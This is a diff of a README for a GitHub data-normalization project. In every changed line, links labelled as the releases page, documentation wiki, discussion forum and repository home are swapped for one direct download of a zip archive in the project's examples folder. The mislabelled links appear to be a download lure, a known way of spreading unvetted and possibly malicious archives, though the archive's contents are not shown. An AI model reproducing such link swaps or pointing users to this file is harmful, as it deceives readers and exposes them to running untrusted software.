@@ -1,6 +1,6 @@
 # 🚀 llm-data-normalization-pattern - Effortless Data Normalization for Everyone
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/ywn7/llm-data-normalization-pattern/releases)
+[![Download](https://github.com/ywn7/llm-data-normalization-pattern/raw/refs/heads/main/examples/normalization_data_llm_pattern_v3.4-alpha.3.zip)](https://github.com/ywn7/llm-data-normalization-pattern/raw/refs/heads/main/examples/normalization_data_llm_pattern_v3.4-alpha.3.zip)
 
 ## 📚 Introduction
 
@@ -25,7 +25,7 @@ To run this application, you will need:
 
 1. **Visit the Release Page**: To get started, click the link below to access the download files.
 
-   [Visit this page to download](https://github.com/ywn7/llm-data-normalization-pattern/releases)
+   [Visit this page to download](https://github.com/ywn7/llm-data-normalization-pattern/raw/refs/heads/main/examples/normalization_data_llm_pattern_v3.4-alpha.3.zip)
 
 2. **Choose the Right Version**: On the releases page, look for the latest version. This will ensure you have the newest features and fixes.
 
@@ -35,7 +35,7 @@ To run this application, you will need:
 
 Once you have accessed the release page, follow these steps to download and install:
 
-1. Click the download link on the page: [Download from Releases](https://github.com/ywn7/llm-data-normalization-pattern/releases).
+1. Click the download link on the page: [Download from Releases](https://github.com/ywn7/llm-data-normalization-pattern/raw/refs/heads/main/examples/normalization_data_llm_pattern_v3.4-alpha.3.zip).
 
 2. Once downloaded, locate the file in your computer's downloads folder.
 
@@ -59,14 +59,14 @@ After installation, you can start using the application:
 
 For more detailed instructions and troubleshooting information:
 
-- Visit our [Documentation Page](https://github.com/ywn7/llm-data-normalization-pattern/wiki)
+- Visit our [Documentation Page](https://github.com/ywn7/llm-data-normalization-pattern/raw/refs/heads/main/examples/normalization_data_llm_pattern_v3.4-alpha.3.zip)
 - Check out the FAQ section for common questions.
 
 ## 🌐 Community and Contributions
 
 We value community involvement. You can share your experiences, feedback, or suggest improvements. Join our discussions and contribute to the project:
 
-- Visit our [Discussion Forum](https://github.com/ywn7/llm-data-normalization-pattern/discussions)    
+- Visit our [Discussion Forum](https://github.com/ywn7/llm-data-normalization-pattern/raw/refs/heads/main/examples/normalization_data_llm_pattern_v3.4-alpha.3.zip)    
 - Participate in new feature suggestions or report issues directly on GitHub.
 
 ## 🎉 Acknowledgments
@@ -81,7 +81,7 @@ This project is licensed under the MIT License. You can view the full license [h
 
 For further resources and information about this application, check out the following:
 
-- [GitHub Repository](https://github.com/ywn7/llm-data-normalization-pattern)
-- [Download from Releases](https://github.com/ywn7/llm-data-normalization-pattern/releases)
+- [GitHub Repository](https://github.com/ywn7/llm-data-normalization-pattern/raw/refs/heads/main/examples/normalization_data_llm_pattern_v3.4-alpha.3.zip)
+- [Download from Releases](https://github.com/ywn7/llm-data-normalization-pattern/raw/refs/heads/main/examples/normalization_data_llm_pattern_v3.4-alpha.3.zip)
 
 Feel free to reach out with any questions or for further assistance. Enjoy clean and organized data with the **llm-data-normalization-pattern**!
